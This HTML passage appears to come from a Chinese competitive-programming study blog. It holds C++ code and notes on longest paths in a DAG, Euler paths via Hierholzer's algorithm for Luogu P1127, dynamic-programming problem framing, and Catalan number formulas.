class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>indeg<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 多源起点</span>        q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> u <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dist<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">!=</span> NEG<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token punctuation">[</span>v<span class="token punctuation">,</span> w<span class="token punctuation">]</span> <span class="token operator">:</span> adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dist<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dist<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">,</span> dist<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> w<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span>indeg<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token punctuation">[</span>v<span class="token punctuation">,</span> w<span class="token punctuation">]</span> <span class="token operator">:</span> adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span>indeg<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token keyword">long</span> ans <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>dist<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dist<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>适用</strong>：要求整个 DAG 上的最长路。</li><li><strong>结果</strong>：ans 就是最长路径的长度。</li></ul><hr><h3 id="📌-小提示"><strong>📌 小提示</strong></h3><ul><li>记得用 long long，避免路径和爆 int。</li><li>NEG 要足够小，不然会被 +w 误更新。</li><li>如果要输出具体路径，可以额外记录 <code>pre[v]</code> 来回溯。</li></ul><hr><h2 id="欧拉路径">欧拉路径</h2><h3 id="建模触发器">建模触发器</h3><p>题面一旦出现：<strong>“把每个单词都用一次、能连就连、输出整条链”</strong><br>→ 下意识联想到：<strong>欧拉路径（边全用一次）</strong></p><ul><li>点 = 字母（a…z）</li><li>边 = 单词（s[0] → s.back()，边上带着单词）</li></ul><h3 id="先验判定（能不能存在）">先验判定（能不能存在）</h3><p>有向图欧拉路径充要条件（忽略方向连通 + 入出度条件）：</p><ul><li>忽略方向后，所有<strong>出现过的点</strong>在同一连通分量（否则必然“断链”）。</li><li>入/出度：<ul><li>欧拉回路：所有点 in = out</li><li>欧拉路径：恰有一个点 out = in + 1（起点），一个点 in = out + 1（终点），其余 in = out</li><li>其他情况 → 不存在</li></ul></li></ul><h3 id="起点怎么“自己选”"><strong>起点怎么“自己选”</strong></h3><ul><li>若存在路径（非回路）：<strong>起点 = out = in + 1 的点</strong>（唯一）。</li><li>若是回路：理论上任意有边的点都可做起点。<br>为了<strong>字典序最小</strong>的成链，你的做法（每个点的出边按字典序取最小）已保证整体最小；起点通常选<strong>最小字母且出度&gt;0</strong>就行。</li></ul><h3 id="为啥“对起点做-DFS-就对了”">为啥“对起点做 DFS 就对了”</h3><p>核心是 <strong>Hierholzer 算法</strong>（欧拉路/回路的标准构造）：</p><ul><li>在当前点反复“取一条尚未用过的出边”走下去（你按字典序取最小）；</li><li>没路可走就<strong>回溯</strong>，把刚走完的边对应的单词<strong>压入答案</strong>；</li><li>因为边是“走完才收录”，最后得到的是<strong>逆序</strong>，所以要 reverse。</li></ul><blockquote><p>正确性的直觉：像在一个区域里“抽线”，抽到抽不动了就封口记录，最终把所有边都抽走一次，拼起来就是欧拉路；你按最小边优先走，得到的就是字典序最小。</p></blockquote><h3 id="为什么“dp-最短路-拓扑”都不合适">为什么“dp/最短路/拓扑”都不合适</h3><ul><li>要求“<strong>每条边恰好一次</strong>”是欧拉问题的专属信号；</li><li>拓扑/最短路/DP关心的是“点/路径权值/次数”，不是“边使用一次且全覆盖”。</li><li>所以这题不是“找最优”，而是“找一条恰好覆盖全部边的道”，自然落在 Hierholzer。</li></ul><h3 id="可复用“推导清单”"><strong>可复用“推导清单”</strong></h3><ol><li>点=字母，边=单词（首→尾），边上存字符串</li><li>统计 in/out，并记录出现过的点</li><li>忽略方向做连通性检查</li><li>判度数：路径态/回路态；</li><li>起点：out=in+1 的点；若回路选最小出度&gt;0 的点</li><li>各 <code>adj[u]</code> 升序，遍历时用 back()+pop_back()</li><li>跑 Hierholzer（递归/栈），收集边，逆序输出用 . 相连</li><li>验证边数是否都用到（<code>res.size()==n</code>）<br>见 luogu <a href="https://www.luogu.com.cn/problem/P1127">P1127</a></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span><span class="token operator">&amp;</span>adj<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        string s<span class="token operator">=</span>adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>adj<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token char">'a'</span><span class="token punctuation">,</span>adj<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 一个欧拉路径遍历的图？</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token function">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">>></span><span class="token function">adj</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>string <span class="token operator">&amp;</span>s<span class="token operator">:</span>str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        adj<span class="token punctuation">[</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token char">'a'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//存单词去建立映射关系</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>v<span class="token operator">:</span>adj<span class="token punctuation">)</span> <span class="token function">sort</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//保证字母序</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">indegree</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">outdegree</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">26</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>string <span class="token operator">&amp;</span>s<span class="token operator">:</span>adj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            outdegree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            indegree<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token char">'a'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 欧拉路径必要条件：有一个起点满足 outdegree-indegree=1，有一个终点满足 indegree-outdegree=1，其余点indegree=outdegree</span>    <span class="token keyword">int</span> start<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">26</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>outdegree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>indegree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>start<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> start<span class="token operator">=</span>i<span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">//多于一个起点</span>                cout<span class="token operator">&lt;&lt;</span><span class="token string">"***"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>indegree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>outdegree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>end<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> end<span class="token operator">=</span>i<span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">//多于一个终点</span>                cout<span class="token operator">&lt;&lt;</span><span class="token string">"***"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>indegree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>outdegree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cout<span class="token operator">&lt;&lt;</span><span class="token string">"***"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>        vector<span class="token operator">&lt;</span>string<span class="token operator">></span>res<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>start<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//没有起点，说明是回路，从任意点开始</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">26</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>outdegree<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    start<span class="token operator">=</span>i<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>           <span class="token punctuation">&#125;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>adj<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span>n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//没有遍历完所有边</span>            cout<span class="token operator">&lt;&lt;</span><span class="token string">"***"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">reverse</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>res<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cout<span class="token operator">&lt;&lt;</span>res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>i<span class="token operator">==</span>res<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">?</span><span class="token string">""</span><span class="token operator">:</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DP">DP</h2><blockquote><p>“我设了个 <code>dp[..]</code>，但是它到底在帮我算什么？目标到底是什么？为什么转移方程就是这么写？”</p></blockquote><hr><h3 id="🌱-动态规划的“核心三问”"><strong>🌱 动态规划的“核心三问”</strong></h3><p>每次遇到题目时，可以强迫自己回答这三个问题：</p><ol><li><p><strong>状态是什么？</strong></p><ul><li>dp[i] / dp[i][j] 代表什么量？</li><li>一句话清晰描述：它是“前 i 个物品的最优解”还是“走到 (i,j) 的最短路径”？</li></ul></li><li><p><strong>目标是什么？</strong></p><ul><li>我要的最终答案是 dp[n]、还是 max(dp[…])、还是 dp[n][m]？</li><li>把“输出需要什么”先对齐，避免“我设的状态跟目标无关”。</li></ul></li><li><p><strong>转移怎么来？</strong></p><ul><li>当前状态能从什么子问题转移而来？</li><li>每次写转移的时候，心里要对应一个“小故事”：比如“第 i 件物品选/不选”，“从左边或上边走过来”。</li></ul></li></ol><hr><h3 id="🌰-举个小例子"><strong>🌰 举个小例子</strong></h3><blockquote><p>最经典：爬楼梯问题。每次可以走 1 步或 2 步，问走到第 n 层的方案数。</p></blockquote><ol><li><p>状态：</p><ul><li>dp[i] = 到达第 i 层的方案数。</li></ul></li><li><p>目标：</p><ul><li>我要求的是 dp[n]。</li></ul></li><li><p>转移：</p><ul><li>走到第 i 层，要么从 i-1 走一步上来，要么从 i-2 跨两步上来。</li><li>所以：dp[i] = dp[i-1] + dp[i-2]。</li></ul></li></ol><p>这个故事就非常清晰：<strong>每个状态对应一个问题，每个转移对应一个选择。</strong></p><hr><h3 id="🔑-小技巧"><strong>🔑 小技巧</strong></h3><ul><li><p>一定要“写文字定义”：比如在草稿纸/注释里写清楚<br>dp[i][j] = 用前 i 件物品、放入容量为 j 的背包时能得到的最大价值。<br>——这样你每次写转移的时候，就能检查：我写的推导是不是跟定义一致。</p></li><li><p>目标不清晰时，回到题目最后一句：“要求的是……”。<br>把它翻译成对应的 dp 状态。</p></li></ul><hr><p>所以“每次设定 dp 目标不清晰”，其实就是<strong>第 2 步没对齐</strong>。<br>解决方法就是：</p><ol><li>明确状态定义；</li><li>明确我要的答案在哪个状态里；</li><li>再来写转移。</li></ol><hr><h3 id="卡特兰数">卡特兰数</h3><p>经典栈序列。</p><ul><li>n 个元素入栈出栈，每一步只能“入”或“出”，且出栈数从不超过入栈数（否则栈空）。</li><li>这等价于括号序列或 Dyck 路径计数：合法序列数量 = Cₙ。</li></ul><p>三种常用公式</p><ol><li><p>递推（DP，最常见，也就是你代码里的式子）<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>0</mn></msub><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mspace width="1em"/><msub><mi>C</mi><mi>n</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msubsup><msub><mi>C</mi><mi>k</mi></msub><mtext> </mtext><msub><mi>C</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn><mo>−</mo><mi>k</mi></mrow></msub></mrow><annotation encoding="application/x-tex">C_0=1,\quad C_n=\sum_{k=0}^{n-1} C_k\,C_{n-1-k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2537em;vertical-align:-0.2997em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span><br>时间 O(n^2)。</p></li><li><p>闭式（组合数）<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>n</mi></msub><mo>=</mo><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mrow><mn>2</mn><mi>n</mi></mrow><mi>n</mi></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">C_n=\frac{1}{n+1}\binom{2n}{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2984em;vertical-align:-0.4033em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951em;"><span style="top:-2.355em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal 